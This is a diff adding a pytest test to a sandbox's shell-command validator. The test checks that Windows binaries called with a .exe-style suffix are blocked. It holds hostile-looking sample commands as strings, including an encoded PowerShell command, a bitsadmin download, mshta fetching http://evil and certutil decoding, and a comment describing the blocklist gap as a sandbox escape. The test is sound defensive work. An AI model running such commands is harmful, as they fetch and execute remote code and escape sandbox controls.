@@ -208,6 +208,32 @@ def test_verify_safe_shell_command_still_allows_relative_test_commands():
         verify_safe_shell_command(cmd)
 
 
+def test_verify_safe_shell_command_blocks_pathext_suffixed_binaries():
+    # cmd.exe's PATHEXT makes `name.exe` (and .com/.bat/.cmd/...) run identically to the
+    # bare name - the blocklist previously only listed a couple of entries (cmd.exe,
+    # reg.exe) with their extension, so every other blocked binary's `.exe` form (above
+    # all `powershell.exe -EncodedCommand <base64>`, which trips none of the other
+    # substring/pattern guards) slipped through as a full sandbox escape.
+    unsafe_cmds = [
+        "powershell.exe -EncodedCommand aGVsbG8=",
+        "PowerShell.EXE -Command Get-Process",
+        "cscript.exe evil.vbs",
+        "wscript.exe evil.vbs",
+        "certutil.exe -decode a.txt b.txt",
+        "bitsadmin.exe /transfer job http://x/y c:\\z",
+        "rundll32.exe evil.dll,Entry",
+        "mshta.exe http://evil",
+        "regsvr32.exe /s /u evil.dll",
+        "python.exe -c \"import os\"",
+        "pip.EXE install evil",
+        "del.com file",
+    ]
+    for cmd in unsafe_cmds:
+        with pytest.raises(ValueError) as excinfo:
+            verify_safe_shell_command(cmd)
+        assert "Security error" in str(excinfo.value)
+
+
 def test_verify_safe_python_code_allows_benign_double_underscore():
     # Refined dunder check: a benign double-underscore identifier is no longer a false positive.
     verify_safe_python_code("x = 'my__var'\nprint(x)")
